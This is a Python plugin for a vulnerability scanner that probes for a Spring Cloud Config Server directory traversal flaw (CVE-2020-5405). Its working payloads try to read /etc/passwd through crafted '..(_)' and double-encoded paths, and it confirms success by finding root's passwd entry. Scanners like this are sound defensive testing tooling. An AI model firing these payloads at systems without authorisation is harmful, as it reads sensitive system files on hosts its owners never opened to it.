# -*- coding:utf-8 -*-

from lib.poc.dummy import *


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    base_url = '{}://{}:{}'.format(service, ip, port)
    for path in ['/a/b/' + '..(_)' * 10 + '/etc/passwd', '/a/b/master/' + '..%252F' * 2 + 'etc%252Fpasswd']:
        target_url = base_url + path
        try:
            r = await http_client(ip, port).get(target_url, timeout=10)
            if r.status_code == 200 and 'root:x:0:0' in r.text:
                ret = {
                    'alert_group': 'Sprint Cloud Config Server Directory Traversal(CVE-2020-5405)',
                    'affects': base_url,
                    'details': 'Sprint Cloud Config Server Directory Traversal\n\n' + target_url
                }
                return ret
        except Exception as e:
            debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 2985, 'http', True, task_msg={})
    run_plugin_test(scan)
